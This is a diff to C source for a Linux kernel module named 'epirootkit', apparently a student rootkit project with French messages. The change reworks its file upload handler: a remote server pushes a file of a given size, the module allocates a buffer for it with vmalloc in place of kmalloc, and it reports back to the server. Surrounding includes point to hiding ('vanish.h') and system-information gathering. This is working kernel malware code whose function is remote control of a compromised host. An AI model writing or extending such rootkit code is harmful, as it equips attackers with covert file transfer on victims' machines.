@@ -9,6 +9,7 @@
 #include <linux/sched.h>
 #include <linux/mm.h>
 #include <linux/utsname.h>
+#include <linux/vmalloc.h>
 
 #include "crypto.h"
 #include "epirootkit.h"
@@ -17,18 +18,11 @@
 #include "vanish.h"
 #include "sysinfo.h"
 #include "io.h"
+#include "upload.h"
 
 #define UPLOAD_BLOCK_SIZE 4096
 
 extern struct socket *get_worker_socket(void);
-
-
-// ===== UPLOAD =====
-static bool receiving_file = false;
-static char *upload_path = NULL;
-static char *upload_buffer = NULL;
-static long upload_size = 0;
-static long upload_received = 0;
 
 // ===== DOWNLOAD =====
 static bool sending_file = false;
@@ -147,7 +141,7 @@ int rootkit_command(char *command, unsigned command_size) {
     
             // Nettoyage
             kfree(upload_path);
-            kfree(upload_buffer);
+            vfree(upload_buffer);
             receiving_file = false;
         }
     
@@ -538,28 +532,28 @@ static int upload_handler(char *args) {
     long size;
     if (kstrtol(size_str, 10, &size) < 0 || size <= 0) {
         ERR_MSG("upload_handler: taille invalide : %s\n", size_str);
-        send_to_server("❌ Taille invalide.\n");
+        send_to_server("Taille invalide.\n");
         return -EINVAL;
     }
 
     if (receiving_file) {
         ERR_MSG("upload_handler: tentative d'upload alors qu'un autre est en cours\n");
-        send_to_server("❌ Upload déjà en cours.\n");
+        send_to_server("Upload déjà en cours.\n");
         return -EBUSY;
     }
 
     upload_path = kstrdup(path_str, GFP_KERNEL);
     if (!upload_path) {
         ERR_MSG("upload_handler: échec kstrdup\n");
-        send_to_server("❌ Erreur allocation chemin.\n");
+        send_to_server("Erreur allocation chemin.\n");
         return -ENOMEM;
     }
 
-    upload_buffer = kmalloc(size, GFP_KERNEL);
+    upload_buffer = vmalloc(size);
     if (!upload_buffer) {
         ERR_MSG("upload_handler: échec allocation buffer (%ld octets)\n", size);
         kfree(upload_path);
-        send_to_server("❌ Erreur allocation mémoire fichier.\n");
+        send_to_server("Erreur allocation mémoire fichier.\n");
         return -ENOMEM;
     }
 
